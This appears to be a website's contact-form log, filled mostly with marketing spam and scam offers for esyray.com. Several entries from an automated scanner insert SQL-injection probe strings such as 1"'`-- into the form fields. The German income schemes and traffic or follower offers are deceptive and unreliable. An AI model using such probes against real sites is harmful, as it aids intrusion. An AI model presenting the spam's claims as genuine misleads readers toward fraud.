+++ 2020-09-26 02:53:48 AM -- Email from: Bobbye Jewell, -- subject: YOU NEED FAST PROXY SERVERS ?, -- email: jewell.bobbye@outlook.com, -- Message is: YOU NEED FAST PROXY SERVERS ?

Check it out this Anonymous and Private Proxy Servers. 
HTTP &amp; SOCKS5 Proxy supported. 
IP Authentication or Password Authentication available.
HERE: https://bit.ly/3ifZkmL
+++ 2020-09-27 09:36:30 PM -- Email from: Ariel Semmens, -- subject: , -- email: semmens.ariel55@gmail.com, -- Message is: Would you be interested in an advertising service that costs less than $50 per month and sends tons of people who are ready to buy directly to your website? Check out: https://bit.ly/buy-more-visitors
+++ 2020-09-28 08:21:46 AM -- Email from: Kerrie Loveless, -- subject: How To Get More Traffic to esyray.com in 2020, -- email: kerrie.loveless@gmail.com, -- Message is: Hi,

We're wondering if you've ever considered taking the content from esyray.com and converting it into videos to promote on social media platforms such as Youtube?

It's another 'rod in the pond' in terms of traffic generation, as so many people use Youtube.

You can read a bit more about the software here: https://www.vidnami.com/c/Paul80-vn-freetrial

Kind Regards,
Kerrie
+++ 2020-09-29 01:33:45 PM -- Email from: arachni_name, -- subject: 1, -- email: arachni@email.gr, -- Message is: 1
+++ 2020-09-29 01:33:45 PM -- Email from: arachni_name, -- subject: 1&quot;'`--, -- email: arachni@email.gr, -- Message is: 1
+++ 2020-09-29 01:33:45 PM -- Email from: , -- subject: , -- email: , -- Message is: 
+++ 2020-09-29 01:33:45 PM -- Email from: arachni_name&quot;'`--, -- subject: 1, -- email: arachni@email.gr, -- Message is: 1
+++ 2020-09-29 01:33:45 PM -- Email from: arachni_name, -- subject: 1, -- email: arachni@email.gr), -- Message is: 1
+++ 2020-09-29 01:33:45 PM -- Email from: arachni_name, -- subject: 1), -- email: arachni@email.gr, -- Message is: 1
+++ 2020-09-29 01:33:45 PM -- Email from: arachni_name, -- subject: 1, -- email: arachni@email.gr, -- Message is: 1)
+++ 2020-09-29 01:33:45 PM -- Email from: arachni_name), -- subject: 1, -- email: arachni@email.gr, -- Message is: 1
+++ 2020-09-29 01:33:45 PM -- Email from: arachni_name, -- subject: 1, -- email: arachni@email.gr, -- Message is: 1
+++ 2020-09-29 01:33:45 PM -- Email from: arachni_name, -- subject: 1, -- email: arachni@email.gr, -- Message is: 1
+++ 2020-09-29 01:33:45 PM -- Email from: arachni_name, -- subject: 1, -- email: arachni@email.gr&quot;'`--, -- Message is: 1
+++ 2020-10-01 04:14:56 PM -- Email from: Chu Valentin, -- subject: Query about your company, -- email: chu.valentin87@msn.com, -- Message is: Good evening, I am a composer and I do produce corporate music which you can use in your company advertisement videos. May I ask in case you’ll need it to consider mine? My only income source is this and I will appreciate a lot any support!
https://1.envato.market/357rk
Best regards
+++ 2020-10-02 08:54:07 AM -- Email from: Lindsay Harrison, -- subject: Important Reminder, -- email: lindsay@topalexadirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
http://topalexadirectory.top/abcc1/?=esyray.com


Lindsay
Voice Activation Follow-up Specialist
Top Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://topalexadirectory.top/out.php?site=esyray.com
+++ 2020-10-03 12:48:46 AM -- Email from: Clemmie Haffner, -- subject: haffner.clemmie@gmail.com, -- email: haffner.clemmie@gmail.com, -- Message is: Would you like to post your ad on thousands of online ad websites every month? For a small monthly payment you can get virtually unlimited traffic to your site forever!

For more information just visit: http://bit.ly/endless-traffic-forever
+++ 2020-10-03 09:32:58 AM -- Email from: arachni_name, -- subject: 1), -- email: arachni@email.gr, -- Message is: 1
+++ 2020-10-03 09:32:58 AM -- Email from: arachni_name&quot;'`--, -- subject: 1, -- email: arachni@email.gr, -- Message is: 1
+++ 2020-10-03 09:32:58 AM -- Email from: arachni_name, -- subject: 1, -- email: arachni@email.gr, -- Message is: 1
+++ 2020-10-03 09:32:58 AM -- Email from: arachni_name), -- subject: 1, -- email: arachni@email.gr, -- Message is: 1
+++ 2020-10-03 09:32:58 AM -- Email from: arachni_name, -- subject: 1, -- email: arachni@email.gr, -- Message is: 1
+++ 2020-10-03 09:32:58 AM -- Email from: arachni_name, -- subject: 1, -- email: arachni@email.gr), -- Message is: 1
+++ 2020-10-03 09:32:58 AM -- Email from: arachni_name, -- subject: 1, -- email: arachni@email.gr, -- Message is: 1
+++ 2020-10-03 09:32:58 AM -- Email from: arachni_name, -- subject: 1, -- email: arachni@email.gr, -- Message is: 1)
+++ 2020-10-03 09:32:58 AM -- Email from: , -- subject: , -- email: , -- Message is: 
+++ 2020-10-03 09:32:58 AM -- Email from: arachni_name, -- subject: 1&quot;'`--, -- email: arachni@email.gr, -- Message is: 1
+++ 2020-10-03 09:32:58 AM -- Email from: arachni_name, -- subject: 1, -- email: arachni@email.gr&quot;'`--, -- Message is: 1
+++ 2020-10-06 06:13:03 AM -- Email from: Rachel Florent, -- subject: surprising, -- email: rachel.florent@videomarketingnow.xyz, -- Message is: Hey, 

You have a lot going on right now, but maybe we can help?

We make professional videos for businesses to put on their websites.

See examples of what we can do for you:
https://www.videomarketingnow.xyz/success/?=esyray.com

These videos are helping businesses GROW right now, at a time when they need it most.

Rachel Florent
Custom Video Specialist





410 Santa Clara St. East, Unit 817	
San Jose,	CA 95113
 
No more video marketing:
https://thevideonetwork.top/out.php/?site=esyray.com
+++ 2020-10-08 05:57:35 AM -- Email from: Nicole Rideout, -- subject: Important Reminder, -- email: nicole@alexadirectory.top, -- Message is: Hey! 

Have you remembered to activate voice search for your business?

Activate it here in 30 seconds:

https://alexadirectory.top/abcc1/?=esyray.com

Without activation, customers may not be able to find esyray.com with voice searches on Google, Amazon Alexa or mobile phones.

Nicole Ritter
Voice Activation Follow-up Specialist














 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://alexadirectory.top/out.php?site=esyray.com
+++ 2020-10-08 09:04:35 AM -- Email from: Dave Stills, -- subject: Sanka, You Dead Mon?, -- email: david@starkwoodmarketing.com, -- Message is: Hey esyray.com, 
 
Can I get you on the horn to discuss relaunching marketing? 
 
Get started on a conversion focused landing page, an automated Linkedin marketing tool, or add explainer videos to your marketing portfolio and boost your ROI. 
 
We also provide graphic design and call center services to handle all those new leads you'll be getting. 
 
 
d.stills@starkwoodmarketing.com 
 
My website is http://StarkwoodMarketing.com
+++ 2020-10-11 06:19:19 PM -- Email from: MichaelWaivy, -- subject: Facebook likes and Insta followers on sale, -- email: abelbreath456@gmail.com, -- Message is: Looking for Facebook likes or Instagram followers? 
We can help you. Please visit https://1000-likes.com/ to place your order.
+++ 2020-10-12 04:22:46 PM -- Email from: Alan Yates, -- subject: Get old and new customers back in your business - Get featured on ABC/NBC/FOX, -- email: ayates@mail.com, -- Message is: Hello 
This year has been a business killer, so I am reaching out to local businesses offering them access to my media connections at significantly discounted rates. 
All local businesses can benefit from greater exposure as additional publicity bring with it more clients. 
A media campaign from SolutionC Media can do just that by making your business feature prominently on the web for the specific services you provide. Stand apart from your competition and be the one that prospective customers find first! 
If you don’t mind, I would like to direct you to a short 2-minute video at - http://bit.ly/SolC-Media 
This video explains a little more and also gives the next steps to provide the information we would need to proceed. 
 
Thank you for your time 
Kind Regards 
Alan Yates 
SolutionC Media
+++ 2020-10-12 09:27:37 PM -- Email from: , -- subject: , -- email: team@bark.com, -- Message is: Hi,

Janet has just asked us to help them find a quality Electrician in Rockwall, TX, 75032.

We’re now contacting local professionals on their behalf, and if you respond quickly there’s a strong chance you’ll secure the business. It’s free to do so, and there’s no obligation to continue using our service in future.

A maximum of 5 professionals can contact Janet, so be quick!

Take a look at Janet’s request below and, if you can help, click the following link to contact them directly.

Contact Janet now: https://www.bark.com/find-work/united-states/rockwall-tx-75032/electricians/637cd00e/p38704998/
                   
Client details:

Janet
Electricians - Rockwall, TX, 75032
Janet has made their phone number available. We will make it available to you when you send your first message.

Project details:

What kind of work do you need doing?: Switch or outlet install

What kind of switch or outlet installation is this?: Replace existing switch or outlets

How many switches or outlets is this for?: 3 switches or outlets

Is there already wiring in the desired location?: Yes, there is existing wiring

Which type(s) of room is this for?: Rooms with water e.g. kitchen, bathroom

Who will purchase the switches/outlets?: I would like to discuss this with the pro

What type of property is this for?: downstairs condo

When do you want the work done?: very quickly under contract and request from buyer




Reply now: https://www.bark.com/find-work/united-states/rockwall-tx-75032/electricians/637cd00e/p38704998/

What is Bark?
Bark is a lead generation service. Customers tell us what they’re looking for and we put them in touch with great companies like yours to help get the job done.

Join today and you’ll be able to contact your first customer on us. After that, there’s no commission, no monthly fee – and everything you make with us is yours to keep.

We’ll send you information about new customers for free, and you can simply pick and choose the ones that work best for you.

Why have we contacted you?
We believe your company can help Janet with their project, and we’d like to put you two in touch.

They’ve asked us to find a great local Electrician, and if you respond right away there’s a strong chance you’ll secure the business.

Contact Janet now: https://www.bark.com/find-work/united-states/rockwall-tx-75032/electricians/637cd00e/p38704998/

If you’d like any help with this, please call (424) 227-5323 (open 24 hours a day, 7 days a week) or email team@bark.com and we'll be happy to assist.

Many thanks, 
Andrew Good

If you don't want to hear from us again when new customers are looking for services in your area click here: https://www.bark.com/en/us/p-unsubscribe/LDnp29/7GnQVA/?x=1
+++ 2020-10-13 01:03:31 AM -- Email from: , -- subject: , -- email: team@bark.com, -- Message is: Hi,

Russell has just asked us to help them find a quality Electrician in Royse City, TX, 75189.

We’re now contacting local professionals on their behalf, and if you respond quickly there’s a strong chance you’ll secure the business. It’s free to do so, and there’s no obligation to continue using our service in future.

A maximum of 5 professionals can contact Russell, so be quick!

Take a look at Russell’s request below and, if you can help, click the following link to contact them directly.

Contact Russell now: https://www.bark.com/find-work/united-states/royse-city-tx-75189/electricians/ecbc4225/p38704998/
                   
Client details:

Russell
Electricians - Royse City, TX, 75189
Russell has made their phone number available. We will make it available to you when you send your first message.

Project details:

What kind of work do you need doing?: Other appliance installation

What type of property is this for?: House

Which type(s) of appliance need installing?: Fan or air conditioner

When do you want the work done?: As soon as possible




Reply now: https://www.bark.com/find-work/united-states/royse-city-tx-75189/electricians/ecbc4225/p38704998/

What is Bark?
Bark is a lead generation service. Customers tell us what they’re looking for and we put them in touch with great companies like yours to help get the job done.

Join today and you’ll be able to contact your first customer on us. After that, there’s no commission, no monthly fee – and everything you make with us is yours to keep.

We’ll send you information about new customers for free, and you can simply pick and choose the ones that work best for you.

Why have we contacted you?
We believe your company can help Russell with their project, and we’d like to put you two in touch.

They’ve asked us to find a great local Electrician, and if you respond right away there’s a strong chance you’ll secure the business.

Contact Russell now: https://www.bark.com/find-work/united-states/royse-city-tx-75189/electricians/ecbc4225/p38704998/

If you’d like any help with this, please call (424) 227-5323 (open 24 hours a day, 7 days a week) or email team@bark.com and we'll be happy to assist.

Many thanks, 
Andrew Good

If you don't want to hear from us again when new customers are looking for services in your area click here: https://www.bark.com/en/us/p-unsubscribe/LDnp29/3Vn7mn/?x=1
+++ 2020-10-13 01:54:16 AM -- Email from: Ilana Wills, -- subject: YOU NEED QUALITY VISITORS ?, -- email: wills.ilana@googlemail.com, -- Message is: YOU NEED QUALITY VISITORS for your: esyray.com
 
My name is Ilana Wills, and I'm a Web Traffic Specialist. I can get:
  -  visitors from search engines
  -  visitors from social media
  -  visitors from any country you want
  -  very low bounce rate &amp; long visit duration
 
CLAIM YOUR 24 HOURS FREE TEST =&gt;  https://bit.ly/3nnmM4I
+++ 2020-10-13 05:52:00 AM -- Email from: James Roberts, -- subject: cheap monthly SEO plans, -- email: no-reply@hilkom-digital.de, -- Message is: Hеllо! 
I have just checked esyray.com for the ranking keywords and seen that your SEO metrics could use a boost. 
 
We will improve your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our pricelist here, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start increasing your sales and leads with us, today! 
 
regards 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2020-10-13 07:06:27 PM -- Email from: Eric Jones, -- subject: Who needs eyeballs, you need BUSINESS, -- email: eric@talkwithwebvisitor.com, -- Message is: My name’s Eric and I just came across your website - esyray.com - in the search results.

Here’s what that means to me…

Your SEO’s working.

You’re getting eyeballs – mine at least.

Your content’s pretty good, wouldn’t change a thing.

BUT…

Eyeballs don’t pay the bills.

CUSTOMERS do.

And studies show that 7 out of 10 visitors to a site like esyray.com will drop by, take a gander, and then head for the hills without doing anything else.

It’s like they never were even there.

You can fix this.

You can make it super-simple for them to raise their hand, say, “okay, let’s talk” without requiring them to even pull their cell phone from their pocket… thanks to Talk With Web Visitor.

Talk With Web Visitor is a software widget that sits on your site, ready and waiting to capture any visitor’s Name, Email address and Phone Number.  It lets you know immediately – so you can talk to that lead immediately… without delay… BEFORE they head for those hills.
  
CLICK HERE http://www.talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Now it’s also true that when reaching out to hot leads, you MUST act fast – the difference between contacting someone within 5 minutes versus 30 minutes later is huge – like 100 times better!

That’s what makes our new SMS Text With Lead feature so powerful… you’ve got their phone number, so now you can start a text message (SMS) conversation with them… so even if they don’t take you up on your offer right away, you continue to text them new offers, new content, and new reasons to do business with you.

This could change everything for you and your business.

CLICK HERE http://www.talkwithwebvisitors.com to learn more about everything Talk With Web Visitor can do and start turing eyeballs into money.

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – you could be converting up to 100x more leads immediately!   
It even includes International Long Distance Calling. 
Paying customers are out there waiting. 
Starting connecting today by CLICKING HERE http://www.talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2020-10-15 04:18:06 AM -- Email from: RobertGlync, -- subject: THE MISSION OF THIS MESSAGE IS?, -- email: info@deoleodigitalpublishing.com, -- Message is: HAVE YOU EVER WANTED TO CONVERT 100% OF YOUR PROSPECTS INTO LOYAL CUSTOMERS FOR YOUR BUSINESS? 
 
Watch the Official Trailer : https://youtu.be/hb7qJmAIb9M 
 
Use this link below to Download your E-book copy Now! (50%off! )@ https://www.tonydeoleo.com 
 
Or visit Amazon 
Amazon : https://www.amazon.com/gp/aw/d/B08CG7DYKX/ref=tmm_kin_title_0?ie=UTF8&amp;qid=&amp;sr= 
 
THE ART OF DEALING: Becoming a mastercasino dealer. https://www.amazon.com/dp/B08KYKG9MT/ref=cm_sw_r_wa_awdb_t1_KknGFbA7N0C1C.
+++ 2020-10-15 07:40:14 AM -- Email from: Nicole Rideout, -- subject: Important Reminder, -- email: nicole@alexadirectory.top, -- Message is: Hey! 

Have you remembered to activate voice search for your business?

Activate it here in 30 seconds:

https://alexadirectory.top/abcc1/?=esyray.com

Without activation, customers may not be able to find esyray.com with voice searches on Google, Amazon Alexa or mobile phones.

Nicole Ritter
Voice Activation Follow-up Specialist














 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://alexadirectory.top/out.php?site=esyray.com
+++ 2020-10-15 08:55:02 AM -- Email from: Rachel Florent, -- subject: surprising, -- email: rachel.florent@videomarketingnow.xyz, -- Message is: Hey, 

You have a lot going on right now, but maybe we can help?

We make professional videos for businesses to put on their websites.

See examples of what we can do for you:
https://www.videomarketingnow.xyz/success/?=esyray.com

These videos are helping businesses GROW right now, at a time when they need it most.

Rachel Florent
Custom Video Specialist





410 Santa Clara St. East, Unit 817	
San Jose,	CA 95113
 
No more video marketing:
https://thevideonetwork.top/out.php/?site=esyray.com
+++ 2020-10-15 09:59:36 AM -- Email from: Ulrich Carman, -- subject: , -- email: carman.ulrich@gmail.com, -- Message is: Do you want more people to visit your website? Receive hundreds of keyword targeted visitors directly to your site. Boost revenues super fast. Start seeing results in as little as 48 hours. For more info Visit: http://www.easy-web-traffic.xyz
+++ 2020-10-15 12:09:05 PM -- Email from: JoshuaBrupe, -- subject: EINNAHMEN IM INTERNET VOR 8946 EUR IN DER WOCHE - IN EINEM MONAT KONNEN SIE SICH EIN TEURES AUTO KAUFEN: http://xsle.net/3glx7, -- email: D.Konieczny@hotmail.de, -- Message is: PASSIVES EINKOMMEN ONLINE VOR 6856 EURO AM TAG - IN EINEM MONAT KONNEN SIE IHREN JOB SICHER KUNDIGEN: http://freeurlredirect.com/3jvk7
+++ 2020-10-16 05:51:22 PM -- Email from: Kathy Martin, -- subject: RE: your social media, -- email: skyrocket_1@outlook.com, -- Message is: Hi,

We are one of the largest suppliers of social media services.
Facebook, Twitter, Instagram and Youtube.

Give your social media a huge amount of followers,
likes, shares, subscribers and views fast and at a great price.

For more info please visit us at https://social-media-blast.com

We look forward to skyrocketing your social media needs.

Kind Regards,
Kathy
SMB
+++ 2020-10-16 11:11:17 PM -- Email from: Klara Pabst, -- subject: This software makes me hate Internet Marketing, -- email: klara.pabst26@gmail.com, -- Message is: Hi,

I’ve just tried this software, and I can tell this has changed the way I make money online.
=&gt;&gt; https://seoclerkspro.com/recommends/buzzpress/cf

In fact, it makes me hate Internet Marketing.

Here’s why:

Before this, I could spend countless hours in front of my computer just to generate more leads, increasing the conversion rates, or just trying to generate more visitors to my sites.

On the weekend, I could spend more than 12 hours working on my sites.

…And I absolutely love it!

All the struggle and sleepless nights have made me fall in love with Internet Marketing from the start. I’m obsessed with it.
That’s until I gave Buzzpress a try.

When this software launched a few days ago, I decided to give it a try and see if it really works for me.

Anyway, making money with this software is as easy as this:

1.   I spent 15 minutes to decide the niche
2.   Another 15 minutes to set up a fresh website
3.   And a few minutes to set up an automation system, which is designed to generate traffic on autopilot

After that, I just need to wait.

To my surprise, this morning I just got a sales notification from one affiliate product I’m promoting on my website.

Crazy, right?

I know it’s not that instantly, but considering the fact I spend no more than an hour to make the sale, it completely blew my mind.
“So how does it make you hate Internet Marketing?” you might ask.
=&gt;&gt; https://seoclerkspro.com/recommends/buzzpress/cf

Well, as I mentioned earlier, I love Internet Marketing because of all the struggles and the sleepless night I spent just for making $100.

This software completely eliminates that.

That’s how it made me hate Internet Marketing.

If you’re interested to buy this software, just remember: This is NOT for everyone.

If you love all the struggle and the countless hours you spend on your computer, then this is absolutely not for you.

But if you want an easier way, less time working and more time enjoying the profit, then this is probably the one you’ve been waiting for.

…And here’s the link to get the software: https://seoclerkspro.com/recommends/buzzpress/cf

All the best,
SeoClerksPro Team
[SeoClerksPro Marketer's Pvt]
+++ 2020-10-17 08:25:27 AM -- Email from: ONLINE VERDIENEN VOR 9068 EURO AM TAG - DIE BESTE INVESTITIONSMOGLICHKEIT: https://slimex365.com/3h062, -- subject: EINNAHMEN IM INTERNET VOR 7975 EURO PRO TAG - DIE BESTE INVESTITIONSMOGLICHKEIT: https://links.wtf/rhLk, -- email: nkseager@hotmail.co.uk, -- Message is: EINNAHMEN IM INTERNET VON 7058 EURO IN DER WOCHE - DER BESTE WEG, UM ONLINE GELD ZU VERDIENEN: http://freeurlredirect.com/3jyl6
+++ 2020-10-19 07:21:27 AM -- Email from: PASSIVES EINKOMMEN IM INTERNET VOR 8746 EURO PRO TAG - KEINE BERUFSERFAHRUNG: http://gongpo.moum.kr/xVz7, -- subject: EINNAHMEN IM INTERNET VOR 4846 EUR IN DER WOCHE - KEINE BERUFSERFAHRUNG: http://asq.kr/D6dBd5Q46Yur, -- email: , -- Message is: PASSIVES EINKOMMEN IM INTERNET VOR 9846 EURO AM TAG - KEINE BERUFLICHEN FAHIGKEITEN: https://slimex365.com/3gse6 
EINNAHMEN IM INTERNET VON 4758 EURO IN DER WOCHE - IN EINEM MONAT KONNEN SIE IHREN JOB SICHER KUNDIGEN: https://ecuadortenisclub.com/3ebts 
PASSIVES EINKOMMEN IM INTERNET VOR 9747 EURO IN DER WOCHE - KEINE BERUFSERFAHRUNG: https://ecuadortenisclub.com/3eb2r 
EINNAHMEN IM INTERNET VON 7956 EURO IN DER WOCHE - DER BESTE WEG, UM ONLINE GELD ZU VERDIENEN: https://qspark.me/2GkRID 
PASSIVES EINKOMMEN ONLINE VON 4868 EURO PRO TAG - KEINE BERUFLICHEN FAHIGKEITEN: http://gongpo.moum.kr/xWF5
+++ 2020-10-20 05:39:30 AM -- Email from: Mike Durham, -- subject: New: DA50 for esyray.com, -- email: no-replytam@google.com, -- Message is: Hi there 
 
If you want to get ahead of your competition, have a higher Domain Authority score. Its just simple as that. 
With our service you get Domain Authority above 50 points in just 30 days. 
 
This service is guaranteed 
 
For more information, check our service here 
https://www.monkeydigital.co/Get-Guaranteed-Domain-Authority-50/ 
 
N E W : 
DA60 is now available here 
https://www.monkeydigital.co/product/moz-da60-seo-plan/ 
 
 
thank you 
Mike Durham
 
Monkey Digital 
support@monkeydigital.co
+++ 2020-10-20 10:19:15 AM -- Email from: Francis Jamieson, -- subject: Voice search, -- email: francis.jamieson@newalexabusinessdirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://newalexabusinessdirectory.top/abcc1/?=esyray.com


 

 
Francis















 
1 7 1 Passaic str eet, Garf eld NJ 0 7 0 2 6

You can skip future marketing messages here:
https://newalexabusinessdirectory.top/out.php?site=esyray.com
+++ 2020-10-21 10:02:00 AM -- Email from: PASSIVES EINKOMMEN ONLINE VON 3757 EURO IN DER WOCHE - INNERHALB EINER WOCHE SIND SIE FINANZIELL UNABHANGIG: https://gmy.su/:TSfub, -- subject: EINNAHMEN IM INTERNET VOR 9856 EURO PRO TAG - IN EINEM MONAT KONNEN SIE SICH EINE TEURE WOHNUNG KAUFEN: https://slimex365.com/3gupm, -- email: jheine417@yahoo.com, -- Message is: PASSIVES EINKOMMEN ONLINE VON 9965 EURO IN DER WOCHE - INNERHALB EINER WOCHE SIND SIE FINANZIELL UNABHANGIG: https://ecuadortenisclub.com/3e4yp 
PASSIVES EINKOMMEN ONLINE VOR 3868 EUR IN DER WOCHE - IN EINEM MONAT KONNEN SIE SICH EINE TEURE WOHNUNG KAUFEN: http://xsle.net/3goba 
PASSIVES EINKOMMEN VON 6858 EUR AM TAG - DIE BESTE SEITE, UM ONLINE GELD ZU VERDIENEN: https://qspark.me/bPSxdj 
PASSIVES EINKOMMEN ONLINE VOR 5956 EURO IN DER WOCHE - KEINE BERUFSERFAHRUNG: https://darknesstr.com/3e5ad 
PASSIVES EINKOMMEN VON 7856 EURO IN DER WOCHE - KEINE BERUFSERFAHRUNG: https://darknesstr.com/3ds8n
+++ 2020-10-21 02:26:59 PM -- Email from: Linda Ray, -- subject: Google Remarketing Not Running?, -- email: linda.ray@theremarketingguys.com, -- Message is: I noticed that you are not running Google Remarketing on your website. 
 
The most affordable advertising is marketing to previous web viewers who didn't convert. 
 
Remarketing via Google &amp; Facebook ads means tracking and engaging these 'lost' customers. 
They were on your site once and may only need a reminder of your services and business. 
 
Can I help you grab these low hanging fruits? 
 
Linda Ray 
Email - linda@theremarketingguys.com 
Website - http://www.theremarketingguys.com
+++ 2020-10-21 07:08:58 PM -- Email from: Nicole Evans, -- subject: RE: Reputation, -- email: fixit@monemail.com, -- Message is: Hi,

We are one of the largest suppliers of social media marketing services.

Do you have negative reviews or not enough social media followers and likes?
Get likes, followers and views for your business fast. 

Online reputation companies charge you thousands of dollars for this.
You can do this with a push of a button starting at $22.00.

Choose as few or as many as you see fit. 
Takes minutes and save thousands of dollars.
Turnaround time is 48 hours.

We look forward to helping your social media needs.

Kind Regards,
Nicole
https://social-media-blast.com
+++ 2020-10-22 01:48:29 AM -- Email from: Roslyn Dockery, -- subject: dockery.roslyn@hotmail.com, -- email: dockery.roslyn@hotmail.com, -- Message is: Sick of wasting money on PPC advertising that just doesn't deliver? Now you can post your ad on thousands of ad sites and it'll only cost you one flat fee per month. These ads stay up forever, this is a continual supply of organic visitors! 

To get more info take a look at: http://www.permanent-web-links.xyz
+++ 2020-10-22 09:02:49 PM -- Email from: RobertPep, -- subject: PASSIVES EINKOMMEN ONLINE VOR 3077 EUR PRO TAG - DER BESTE WEG, UM ONLINE GELD ZU VERDIENEN: http://gongpo.moum.kr/xW3Z, -- email: biancaetbucky@orange.fr, -- Message is: &lt;br&gt; 
&lt;br&gt; 
&lt;h1&gt;&lt;a href=&quot;http://gongpo.moum.kr/yapd&quot;&gt; PASSIVES EINKOMMEN VON 4066 EURO PRO TAG - KEINE BERUFLICHEN FAHIGKEITEN &lt;/a&gt;&lt;/h1&gt; 
&lt;h2&gt;&lt;a href=&quot;https://darknesstr.com/3dtif&quot;&gt; PASSIVES EINKOMMEN IM INTERNET VOR 9875 EURO AM TAG - INNERHALB EINER WOCHE SIND SIE FINANZIELL UNABHANGIG &lt;/a&gt;&lt;/h2&gt; 
&lt;h2&gt;&lt;a href=&quot;https://links.wtf/UxVO&quot;&gt; PASSIVES EINKOMMEN IM INTERNET VOR 8758 EUR IN DER WOCHE - IN EINEM MONAT KONNEN SIE SICH EINE TEURE WOHNUNG KAUFEN &lt;/a&gt;&lt;/h2&gt; 
&lt;h2&gt;&lt;a href=&quot;http://wunkit.com/RhMkAA&quot;&gt; PASSIVES EINKOMMEN ONLINE VON 9075 EUR IN DER WOCHE - DER BESTE WEG, UM ONLINE GELD ZU VERDIENEN &lt;/a&gt;&lt;/h2&gt; 
&lt;br&gt; 
&lt;br&gt; 
&lt;br&gt;
+++ 2020-10-23 04:09:13 AM -- Email from: Hattie Tanner, -- subject: Uncertain times, -- email: hattie.tanner@supervideomarketing.top, -- Message is: Hi – I hope you and your family are doing well!

Could your business benefit from a custom-made video right now?

Here's how we can help:
https://www.supervideomarketing.top/success/?=esyray.com


It's a very effective way to convert new customers, especially during these uncertain times!

Be well,
Hattie








- This commercial message sent from PJLK Marketing LC
410 E Santa Clara St. RBLD#817
San Jose, CA 95113

To unsubscribe click here:
https://supervideomarketing.top/out.php/?site=esyray.com
+++ 2020-10-23 06:45:02 PM -- Email from: Willis Hoy, -- subject: Cut &amp; Paste Affiliate $1k Websites, -- email: willis.hoy@hotmail.com, -- Message is: Hey Guys,

Want to CLONE an affiliate site that is making commissions RIGHT NOW?

Well you need this &quot;website cloning&quot; app - which creates an instant &quot;mirror image&quot; of one of the top money-making sites out there:

Click here - CLONE Proven Affiliate Sites...

==&gt; https://seoclerkspro.com/recommends/affiliate-cloner/cf

See, one vital moneymaking skill is: building profitable websites.

I'm talking about websites that make commissions, build your list and get traffic.

But that isn't easy - unless you're some big guru:

• You need to hire a fancy designer - typically $200 to $2,000.. per site

• You need to create content - either do it yourself or pay $10-100 per article

• You need to get traffic - ideally free buyer traffic

And THEN you need to worry about domain names, hosting, wordpress, etc. 

Sounds tricky, right?

But what if there is a solution...

Something that does EVERYTHING for you?

Well, today, THERE IS!

Presenting Affiliate Cloner

==&gt; https://seoclerkspro.com/recommends/affiliate-cloner/cf

This new cloud-based software lets you CLONE this proven, profitable affiliate site so you can...

• Build an instant affiliate website, generating commissions with ClickBank, WarriorPlus &amp; JVZoo

• Generate free traffic from Facebook, Twitter, Instagram, Youtube, TikTok and Pinterest

• Build your list while also making daily commissions

There's NO writing, hosting, domains or content to worry about.

And in case you're wondering...

&quot;But how PROFITABLE is this?&quot;

Well, here's the answer: it CLONES the exact campaigns of an elite super affiliate!

Here's the PROOF:

==&gt; https://seoclerkspro.com/recommends/affiliate-cloner/cf


To your success,
Seoclerkspro Team
(Seoclerkspro Marketer, Pvt)


P.S. There's ONE CATCH: the price increases IN THE NEXT HOUR. And then every hour after that!

So click here to setup your instant affiliate website:
==&gt; https://seoclerkspro.com/recommends/affiliate-cloner/cf
+++ 2020-10-23 11:39:23 PM -- Email from: Eric Jones, -- subject: Who needs eyeballs, you need BUSINESS, -- email: eric@talkwithwebtraffic.com, -- Message is: My name’s Eric and I just came across your website - esyray.com - in the search results.

Here’s what that means to me…

Your SEO’s working.

You’re getting eyeballs – mine at least.

Your content’s pretty good, wouldn’t change a thing.

BUT…

Eyeballs don’t pay the bills.

CUSTOMERS do.

And studies show that 7 out of 10 visitors to a site like esyray.com will drop by, take a gander, and then head for the hills without doing anything else.

It’s like they never were even there.

You can fix this.

You can make it super-simple for them to raise their hand, say, “okay, let’s talk” without requiring them to even pull their cell phone from their pocket… thanks to Talk With Web Traffic.

Talk With Web Traffic is a software widget that sits on your site, ready and waiting to capture any visitor’s Name, Email address and Phone Number.  It lets you know immediately – so you can talk to that lead immediately… without delay… BEFORE they head for those hills.
  
==&gt; http://talkwithwebtraffic.com to try out a Live Demo with Talk With Web Traffic now to see exactly how it works.

Now it’s also true that when reaching out to hot leads, you MUST act fast – the difference between contacting someone within 5 minutes versus 30 minutes later is huge – like 100 times better!

That’s what makes our new SMS Text With Lead feature so powerful… you’ve got their phone number, so now you can start a text message (SMS) conversation with them… so even if they don’t take you up on your offer right away, you continue to text them new offers, new content, and new reasons to do business with you.

This could change everything for you and your business.

==&gt; http://talkwithwebtraffic.com to learn more about everything Talk With Web Traffic can do and start turing eyeballs into money.

Eric
PS: Talk With Web Traffic offers a FREE 14 days trial – you could be converting up to 100x more leads immediately!   
It even includes International Long Distance Calling. 
Paying customers are out there waiting. 
Starting connecting today by ==&gt; http://talkwithwebtraffic.com to try Talk With Web Traffic now.

If you'd like to unsubscribe click here http://talkwithwebtraffic.com/unsubscribe.aspx?d=esyray.com
